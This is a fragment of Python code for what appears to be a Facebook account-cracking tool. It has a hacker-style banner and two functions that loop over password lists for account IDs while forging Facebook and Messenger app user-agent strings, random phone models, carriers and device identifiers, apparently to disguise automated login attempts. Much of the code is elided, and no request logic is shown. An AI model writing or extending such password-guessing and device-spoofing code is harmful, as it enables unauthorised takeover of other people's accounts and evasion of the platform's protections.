...
logo=(f"""\033[1;37m
       .d88888b   88888888b  888888ba  d888888P dP 
88.    "'  88         88    `8b    88    88 
`Y88888b. a88aaaa    a88aaaa8P'    88    88 
      `8b  88         88   `8b.    88    88 
d8'   .8P  88         88    .88    88    88 
 Y88888P   88888888P  88888888P    dP    dP 
 ...
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 0,3
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/118.35.5.80;FBBV/61222082;FBDM/{density=1.6,width=1240,height=1969};FBLC/en_US;FBRV/91743282;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.8;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]+[FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
